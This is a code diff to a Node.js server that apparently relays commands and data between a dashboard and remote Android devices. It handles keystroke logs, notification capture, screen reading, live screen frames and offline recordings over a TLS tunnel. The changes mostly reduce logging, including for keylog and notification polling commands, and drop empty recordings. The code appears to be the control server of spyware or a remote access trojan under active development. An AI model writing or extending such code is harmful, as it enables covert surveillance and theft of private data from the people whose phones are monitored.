@@ -386,11 +386,12 @@ function broadcastDash(event, data) {
 // Both TCP and WS messages go through here
 // ============================================
 async function processMessage(clientId, clientType, event, data) {
-    // Skip per-message log for high-frequency events — logging every frame/keylog/notification
-    // iterates all log clients and adds measurable latency on the hot relay path.
-    const highFreq = event === 'stream:frame' || event === 'keylog:entry' ||
-                     event === 'notification:entry' || event === 'app:foreground' ||
-                     event === 'device:heartbeat' || event === 'device:pong';
+    // Skip per-message log for high-frequency / noisy events.
+    const highFreq = event === 'stream:frame'       || event === 'keylog:entry'  ||
+                     event === 'notification:entry'  || event === 'app:foreground'||
+                     event === 'device:heartbeat'    || event === 'device:pong'   ||
+                     event === 'command:response'    || event === 'screen:update' ||
+                     event === 'offline_recording:save';
     if (!highFreq) {
         log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
     }
@@ -602,14 +603,15 @@ async function processMessage(clientId, clientType, event, data) {
     if (event === 'offline_recording:save') {
         const conn = tcpClients.get(clientId);
         const deviceId = conn?.deviceId || data?.deviceId;
-        if (deviceId) {
-            broadcastDash('offline_recording:saved', {
-                deviceId,
-                frameCount: data?.frameCount || 0,
-                label: data?.label || '',
-            });
-            log('TCP', `Recording saved on device ${deviceId} (${data?.frameCount || 0} frames) — not stored on server`);
-        }
+        const frameCount = data?.frameCount || 0;
+        // Silently drop empty recordings — Android sends these in bulk on reconnect
+        if (!deviceId || frameCount === 0) return;
+        broadcastDash('offline_recording:saved', {
+            deviceId,
+            frameCount,
+            label: data?.label || '',
+        });
+        log('TCP', `Recording saved on device ${deviceId} (${frameCount} frames)`);
         return;
     }
 
@@ -721,7 +723,6 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
     });
 
     conn.on('close', async () => {
-        log('TCP', `Disconnected ${id} (device: ${conn.deviceId || 'unregistered'}, channel: ${conn.channelType || 'primary'})`);
         tcpClients.delete(id);
         if (conn.deviceId) {
             if (conn.channelType === 'stream') {
@@ -735,7 +736,7 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                 // is STILL the active primary — a new device:register may have already replaced
                 // it (e.g. after our eviction), in which case the device is still online.
                 if (deviceToTcp.get(conn.deviceId) !== id) {
-                    log('TCP', `Stale primary closed for ${conn.deviceId} — new primary active, skipping disconnect broadcast`);
+                    // Stale socket from previous reconnect — suppress noise
                     return;
                 }
                 // Grace period: wait 3 s before marking offline, so rapid reconnects (frp tunnel
@@ -746,9 +747,9 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                     // Re-check: if a new primary has registered in the meantime, skip broadcast
                     if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
                         deviceToTcp.has(disconnectedDeviceId)) {
-                        log('TCP', `Stale primary grace: ${disconnectedDeviceId} reconnected — skipping offline broadcast`);
-                        return;
+                        return; // Device reconnected during grace period — suppress
                     }
+                    log('TCP', `Device ${disconnectedDeviceId} disconnected`);
                     deviceToTcp.delete(disconnectedDeviceId);
                     deviceStreamingState.delete(disconnectedDeviceId);
                     R.markDeviceOffline(disconnectedDeviceId).catch(() => {});
@@ -1016,7 +1017,12 @@ app.post('/api/commands', async (req, res) => {
 
     // Respond immediately — command already sent to device via TCP
     res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
-    log('CMD', `${command} → ${deviceId} [${commandId}]`);
+    // Skip logging for high-frequency polling commands
+    const silentCmds = new Set(['get_keylogs','get_notifications','get_notifications_from_app',
+                                 'screen_reader_read','wake_screen']);
+    if (!silentCmds.has(command)) {
+        log('CMD', `${command} → ${deviceId} [${commandId}]`);
+    }
 
     // Persist to DB fire-and-forget
     new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save().catch(() => {});
@@ -1183,11 +1189,8 @@ setInterval(async () => {
                 if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
             } else {
                 // Primary channel — only mark offline if no newer primary has already taken over.
-                // A new device:register replaces deviceToTcp with the new socket id, so if the
-                // ids don't match this is a ghost/stale socket — discard it silently.
                 if (deviceToTcp.get(conn.deviceId) !== id) {
-                    log('TCP', `Stale primary socket for ${conn.deviceId} cleaned up silently (new primary active)`);
-                    continue;
+                    continue; // Ghost socket from previous reconnect — discard silently
                 }
                 deviceToTcp.delete(conn.deviceId);
                 try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
